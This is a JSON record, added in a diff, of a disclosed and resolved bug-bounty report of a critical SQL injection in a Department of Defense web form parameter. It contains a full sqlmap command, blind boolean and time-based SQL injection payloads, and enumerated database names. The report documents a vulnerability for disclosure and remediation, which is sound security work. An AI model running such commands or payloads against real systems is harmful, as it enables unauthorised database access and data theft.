@@ -1,0 +1,118 @@
+{
+  "id": 1627995,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI3OTk1",
+  "url": "https://hackerone.com/reports/1627995",
+  "title": "SQL injection at [https://█████████] [HtUS]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-06T14:04:16.847Z",
+  "submitted_at": "2022-07-06T14:04:16.935Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "malcolmx",
+    "url": "/malcolmx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-09-14T21:04:28.150Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-11T11:24:46.551Z",
+  "team_member_agreed_on_going_public_at": "2022-09-14T21:04:27.980Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\n##Summary\n\nwhile doing test on [`www.███`](http://www.██████/) I’ve found that the endpoint at [`/olc/███comments/comment_post.php`](https://████████) is vulnerable with SQL injection vulnerability\n\n##Vulnerable parameters \n\n- staff_student\n\n##POC\n\n- using sqlmap run command\n\n```jsx\npython3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u \"https://███████\" --data=\"staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments\" -p staff_student --dbms=mysql \n```\n\n- we can see that the target parameter is vulnerable\n\n```jsx\nPOST parameter 'staff_student' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\nsqlmap identified the following injection point(s) with a total of 103 HTTP(s) requests:\n---\nParameter: staff_student (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: staff_student=STUDENT'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments\n```\n\n{F1810520}\n- add `--dbs` we can see the sqlmap will start get the DBS\n\n```jsx\navailable databases [13]:\n[] █████████\n[] ██████mobile\n[] GET\n[] information_schema\n[] LEAM\n[] leat\n[] LEV\n[] mysql\n[] performance_schema\n[] SET\n[] test\n[] testadmin\n[*] testusers\n```\n\n\n{F1810521}\n\n## Impact\n\nattacker is able to get the database",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 29,
+  "voters": [
+    "loaymorad",
+    "m4khn0",
+    "0xm5awy",
+    "haxor31337",
+    "zy9ard3",
+    "shreyaschavhan",
+    "red_darkin",
+    "f_m",
+    "shivammusic",
+    "shohag_sp",
+    "and 19 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
